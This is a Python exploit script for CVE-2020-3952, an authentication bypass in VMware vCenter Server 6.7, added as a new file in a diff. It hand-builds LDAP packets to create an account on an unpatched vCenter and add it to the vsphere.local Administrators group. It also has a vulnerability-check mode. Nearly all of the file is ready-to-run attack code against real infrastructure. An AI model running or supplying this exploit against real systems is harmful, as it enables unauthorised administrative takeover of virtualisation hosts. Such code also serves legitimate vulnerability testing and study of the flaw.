@@ -1,0 +1,248 @@
+# Exploit Title: VMware vCenter Server 6.7 - Authentication Bypass
+# Date: 2020-06-01
+# Exploit Author: Photubias
+# Vendor Advisory: [1] https://www.vmware.com/security/advisories/VMSA-2020-0006.html
+# Version: vCenter Server 6.7 before update 3f
+# Tested on: vCenter Server Appliance 6.7 RTM (updated from v6.0)
+# CVE: CVE-2020-3952
+
+#!/usr/bin/env python3
+
+'''
+	Copyright 2020 Photubias(c)        
+        This program is free software: you can redistribute it and/or modify
+        it under the terms of the GNU General Public License as published by
+        the Free Software Foundation, either version 3 of the License, or
+        (at your option) any later version.
+
+        This program is distributed in the hope that it will be useful,
+        but WITHOUT ANY WARRANTY; without even the implied warranty of
+        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+        GNU General Public License for more details.
+
+        You should have received a copy of the GNU General Public License
+        along with this program.  If not, see <http://www.gnu.org/licenses/>.
+        
+        Based (and reverse engineerd from): https://github.com/guardicore/vmware_vcenter_cve_2020_3952
+        
+        File name CVE-2020-3592.py
+        written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be
+        
+        ## Vulnerable setup (requirements): vCenter Server 6.7 that was upgraded from 6.x
+        
+        This is a native implementation without requirements, written in Python 3.
+        Works equally well on Windows as Linux (as MacOS, probably ;-)
+
+        Features: exploit + vulnerability checker
+'''
+
+import binascii, socket, sys, string, random
+
+## Default vars; change at will
+_sIP = '192.168.50.35'
+_iPORT = 389
+_iTIMEOUT = 5
+
+def randomString(iStringLength=8):
+    #sLetters = string.ascii_lowercase
+    sLetters = string.ascii_letters
+    return ''.join(random.choice(sLetters) for i in range(iStringLength))
+
+def getLengthPrefix(sData, sPrefix, hexBytes=1): ## sData is hexlified
+    ## This will calculate the length of the string, and verify if an additional '81' or '82' prefix is needed
+    sReturn = sPrefix
+    if (len(sData) / 2 ) > 255:
+        sReturn  += b'82'
+        hexBytes = 2
+    elif (len(sData) /2 ) >= 128:
+        sReturn += b'81'
+    sReturn += f"{int(len(sData)/2):#0{(hexBytes*2)+2}x}"[2:].encode()
+    return sReturn
+
+def buildBindRequestPacket(sUser, sPass):
+    sUser = binascii.hexlify(sUser.encode())
+    sPass = binascii.hexlify(sPass.encode())
+    ## Packet Construction
+    sPacket = getLengthPrefix(sPass, b'80') + sPass
+    sPacket = getLengthPrefix(sUser, b'04') + sUser + sPacket
+    sPacket = b'020103' + sPacket
+    sPacket = getLengthPrefix(sPacket, b'60') + sPacket
+    sPacket = b'020101' + sPacket
+    sPacket = getLengthPrefix(sPacket, b'30') + sPacket
+    #print(sPacket)
+    return binascii.unhexlify(sPacket)    
+
+def buildUserCreatePacket(sUser, sPass):
+    sUser = binascii.hexlify(sUser.encode())
+    sPass = binascii.hexlify(sPass.encode())
+    def createAttribute(sName, sValue):
+        sValue = getLengthPrefix(sValue, b'04') + sValue
+        sName = getLengthPrefix(sName, b'04') + sName
+        
+        sReturn = getLengthPrefix(sValue, b'31') + sValue
+        sReturn = sName + sReturn
+        sReturn = getLengthPrefix(sReturn, b'30') + sReturn
+        return sReturn
+    
+    def createObjectClass():
+        sReturn = getLengthPrefix(binascii.hexlify(b'top'), b'04') + binascii.hexlify(b'top')
+        sReturn += getLengthPrefix(binascii.hexlify(b'person'), b'04') + binascii.hexlify(b'person')
+        sReturn += getLengthPrefix(binascii.hexlify(b'organizationalPerson'), b'04') + binascii.hexlify(b'organizationalPerson')
+        sReturn += getLengthPrefix(binascii.hexlify(b'user'), b'04') + binascii.hexlify(b'user')
+        
+        sReturn = getLengthPrefix(sReturn, b'31') + sReturn
+        sReturn = getLengthPrefix(binascii.hexlify(b'objectClass'), b'04') + binascii.hexlify(b'objectClass') + sReturn
+        sReturn = getLengthPrefix(sReturn, b'30') + sReturn
+        return sReturn
+    
+    ## Attributes
+    sAttributes = createAttribute(binascii.hexlify(b'vmwPasswordNeverExpires'), binascii.hexlify(b'True'))
+    sAttributes += createAttribute(binascii.hexlify(b'userPrincipalName'), sUser + binascii.hexlify(b'@VSPHERE.LOCAL'))
+    sAttributes += createAttribute(binascii.hexlify(b'sAMAccountName'), sUser)
+    sAttributes += createAttribute(binascii.hexlify(b'givenName'), sUser)
+    sAttributes += createAttribute(binascii.hexlify(b'sn'), binascii.hexlify(b'vsphere.local'))
+    sAttributes += createAttribute(binascii.hexlify(b'cn'), sUser)
+    sAttributes += createAttribute(binascii.hexlify(b'uid'), sUser)
+    sAttributes += createObjectClass()
+    sAttributes += createAttribute(binascii.hexlify(b'userPassword'), sPass)
+    ## CN
+    sCN = binascii.hexlify(b'cn=') + sUser + binascii.hexlify(b',cn=Users,dc=vsphere,dc=local')
+    sUserEntry = getLengthPrefix(sCN, b'04') + sCN
+    
+    ## Packet Assembly (bottom up)
+    sPacket = getLengthPrefix(sAttributes, b'30') + sAttributes
+    sPacket = sUserEntry + sPacket
+    sPacket = getLengthPrefix(sPacket, b'02010268', 2) + sPacket
+    sPacket = getLengthPrefix(sPacket, b'30') + sPacket
+    #print(sPacket)
+    return binascii.unhexlify(sPacket)
+
+def buildModifyUserPacket(sUser):
+    sFQDN = binascii.hexlify(('cn=' + sUser + ',cn=Users,dc=vsphere,dc=local').encode())
+    sCN = binascii.hexlify(b'cn=Administrators,cn=Builtin,dc=vsphere,dc=local')
+    sMember = binascii.hexlify(b'member')
+    ## Packet Construction
+    sPacket = getLengthPrefix(sFQDN, b'04') + sFQDN
+    sPacket = getLengthPrefix(sPacket, b'31') + sPacket
+    sPacket = getLengthPrefix(sMember, b'04') + sMember + sPacket
+    sPacket = getLengthPrefix(sPacket, b'0a010030') + sPacket
+    sPacket = getLengthPrefix(sPacket, b'30') + sPacket
+    sPacket = getLengthPrefix(sPacket, b'30') + sPacket
+    sPacket = getLengthPrefix(sCN, b'04') + sCN + sPacket
+    sPacket = getLengthPrefix(sPacket, b'02010366') + sPacket
+    sPacket = getLengthPrefix(sPacket, b'30') + sPacket
+    #print(sPacket)
+    return binascii.unhexlify(sPacket)
+
+def performBind(s):
+    ## Trying to bind, fails, but necessary (even fails when using correct credentials)
+    dPacket = buildBindRequestPacket('Administrator@vsphere.local','www.IC4.be')
+    s.send(dPacket)
+    sResponse = s.recv(1024)
+    try:
+        sResponse = sResponse.split(b'\x04\x00')[0][-1:]
+        sCode = binascii.hexlify(sResponse).decode()
+        if sCode == '31': print('[+] Ok, service reachable, continuing')
+        else: print('[-] Something went wrong')
+    except:
+        pass
+    return sCode
+
+def performUserAdd(s, sUser, sPass):
+    dPacket = buildUserCreatePacket(sUser,sPass)
+    s.send(dPacket)
+    sResponse = s.recv(1024)
+    try:
+        sCode = sResponse.split(b'\x04\x00')[0][-1:]
+        sMessage = sResponse.split(b'\x04\x00')[1]
+        if sCode == b'\x00':
+            print('[+] Success! User ' + sUser + '@vsphere.local added with password ' + sPass)
+        elif sCode == b'\x32':
+            print('[-] Error, this host is not vulnerable (insufficientAccessRights)')
+        else:
+            if sMessage[2] == b'81': sMessage = sMessage[3:].decode()
+            else: sMessage = sMessage[2:].decode()
+            print('[-] Error, user not added, message received: ' + sMessage)
+    except:
+        pass
+    return sCode
+    
+
+def performUserMod(s, sUser, verbose = True):
+    dPacket = buildModifyUserPacket(sUser)
+    s.send(dPacket)
+    sResponse = s.recv(1024)
+    try:
+        sCode = sResponse.split(b'\x04\x00')[0][-1:]
+        sMessage = sResponse.split(b'\x04\x00')[1]
+        if sCode == b'\x00':
+            if verbose: print('[+] User modification success (if the above is OK).')
+        else:
+            if sMessage[2] == b'81': sMessage = sMessage[3:].decode()
+            else: sMessage = sMessage[2:].decode()
+            if verbose: print('[-] Error during modification, message received: ' + sMessage)
+    except:
+        pass
+    return sCode, sMessage
+
+def performUnbind(s):
+    try: s.send(b'\x30\x05\x02\x01\x04\x42\x00')
+    except: pass
+
+def main():
+    global _sIP, _iPORT, _iTIMEOUT
+    _sUSER = 'user_' + randomString(6)
+    _sPASS = randomString(8) + '_2020'
+    bAdduser = False
+    if len(sys.argv) == 1:
+        print('[!] No arguments found: python3 CVE-2020-3592.py <dstIP> [<newUsername>] [<newPassword>]')
+        print('    Example: ./CVE-2020-3592.py ' + _sIP + ' ' + _sUSER + ' ' + _sPASS)
+        print('    Leave username & password empty for a vulnerability check')
+        print('    Watch out for vCenter/LDAP password requirements, leave empty for random password')
+        print('    But for now, I will ask questions')
+        sAnswer = input('[?] Please enter the vCenter IP address [' + _sIP + ']: ')
+        if not sAnswer == '': _sIP = sAnswer
+        sAnswer = input('[?] Want to perform a check only? [Y/n]: ')
+        if sAnswer.lower() == 'n': bAdduser = True
+        if bAdduser:
+            sAnswer = input('[?] Please enter the new username to add [' + _sUSER + ']: ')
+            if not sAnswer == '': _sUSER = sAnswer
+            sAnswer = input('[?] Please enter the new password for this user [' + _sPASS + ']: ')
+            if not sAnswer == '': _sPASS = sAnswer
+    else:
+        _sIP = sys.argv[1]
+        if len(sys.argv) >= 3:
+            _sUSER = sys.argv[2]
+            bAdduser = True
+        if len(sys.argv) >= 4: _sPASS = sys.argv[3]
+
+    ## MAIN
+    print('')
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(_iTIMEOUT)
+    try:
+        s.connect((_sIP,_iPORT))
+    except:
+        print('[-] Error: Host ' + _sIP + ':' + str(_iPORT) + ' not reachable')
+        sys.exit(1)
+
+    performBind(s)
+
+    if bAdduser:
+        sCode = performUserAdd(s, _sUSER, _sPASS)
+
+    if not bAdduser:
+        print('[!] Checking vulnerability')
+        sCode, sMessage = performUserMod(s, 'Administrator', False)
+        if sCode == b'\x32': print('[-] This host is not vulnerable, message: ' + sMessage)
+        else: print('[+] This host is vulnerable!')
+    else:
+        sCode = performUserMod(s, _sUSER)
+    
+    performUnbind(s)
+    
+    s.close()
+
+
+if __name__ == "__main__":
+    main()
